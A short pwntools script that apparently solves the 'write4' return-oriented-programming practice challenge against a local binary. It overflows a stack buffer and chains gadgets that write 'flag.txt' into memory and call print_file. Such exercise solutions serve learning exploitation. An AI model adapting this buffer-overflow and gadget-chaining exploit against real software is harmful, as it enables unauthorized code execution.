#!/usr/bin/python3
import pwn
offset=0x20+8
addr_contian=0x601038
payload =b'A'*offset
payload+=pwn.p64(0x0000000000400690)#pop r14 ; pop r15 ; ret
payload+=pwn.p64(addr_contian)
payload+=b"flag.txt"
payload+=pwn.p64(0x0000000000400628)#mov qword ptr [r14], r15 ; ret
payload+=pwn.p64(0x0000000000400693)#pop rdi;ret
payload+=pwn.p64(addr_contian)
payload+=pwn.p64(0x000000000400510)#print_file@plt
target=pwn.process("./write4")
print(target.recv().decode())
target.sendline(payload)
target.sendline(b"flag.txt\x00")
target.interactive()
